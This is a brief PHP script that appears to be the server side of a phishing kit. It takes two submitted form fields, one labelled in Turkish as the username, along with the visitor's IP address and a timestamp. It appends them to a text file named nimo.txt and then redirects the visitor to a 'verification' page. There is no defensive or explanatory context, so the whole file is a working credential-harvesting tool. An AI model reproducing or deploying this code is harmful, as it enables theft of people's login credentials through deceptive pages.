<?php
$adim1 = $_POST['lol'];
$adim2 =  $_POST['lol2'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('nimo.txt', 'a'); 
fwrite($file, $adim1."-----Kullanici adi-----> " .$adim2. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
echo '';
			header("Refresh:0; url=dogrulama.html");
?>





